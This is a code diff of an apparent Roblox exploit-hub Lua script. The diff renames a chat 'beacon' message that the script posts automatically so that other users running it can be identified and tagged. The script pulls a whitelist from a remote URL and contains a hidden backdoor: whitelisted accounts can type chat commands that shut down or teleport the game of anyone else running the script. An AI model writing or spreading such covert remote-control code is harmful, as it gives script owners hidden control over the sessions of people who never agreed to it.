@@ -2,7 +2,7 @@ local whitelistdata = game:GetService("HttpService"):JSONDecode(game:HttpGet("ht
 local possible = {}
 local debounce = false
 
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh meow")
+game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("meow")
 
 game:GetService("TextChatService").OnIncomingMessage = function(msg)
   if not msg or not msg.TextSource then return end
@@ -12,7 +12,7 @@ game:GetService("TextChatService").OnIncomingMessage = function(msg)
   local prefix = msg.PrefixText
   local props = Instance.new("TextChatMessageProperties")
 
-  if Text:lower() == "-gh meow" then
+  if Text:lower() == "meow" then
     if not whitelistdata[tostring(Player.UserId)] and not table.find(possible, Player) then
     table.insert(possible, Player)
     end
@@ -25,7 +25,7 @@ game:GetService("TextChatService").OnIncomingMessage = function(msg)
   if whitelistdata[tostring(Player.UserId)] then
     props.PrefixText = "<font color='rgb(" .. whitelistdata[tostring(Player.UserId)].color[1] .. ", " .. whitelistdata[tostring(Player.UserId)].color[2] .. ", " .. whitelistdata[tostring(Player.UserId)].color[3] .. ")'>[" .. whitelistdata[tostring(Player.UserId)].tag .. "]</font> " .. prefix
   elseif table.find(possible, Player) and whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
-    props.PrefixText = "<font color='rgb(0, 0, 255)'>[POSSIBLE MOON CONVERT USER]</font> " .. prefix
+    props.PrefixText = "<font color='rgb(252, 85, 73)'>[POSSIBLE MOON CONVERT USER]</font> " .. prefix
   end
 
   if whitelistdata[tostring(Player.UserId)] and Text:lower() == "-kill default" and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
@@ -34,8 +34,8 @@ game:GetService("TextChatService").OnIncomingMessage = function(msg)
         game:Shutdown()
     elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-bring default" and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
       game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame = Player.Character.Humanoid.RootPart.CFrame
-    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-gh meow" and debounce == false and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
-      game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh meow")
+    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "meow" and debounce == false and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
+      game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("meow")
     end
   return props
 end
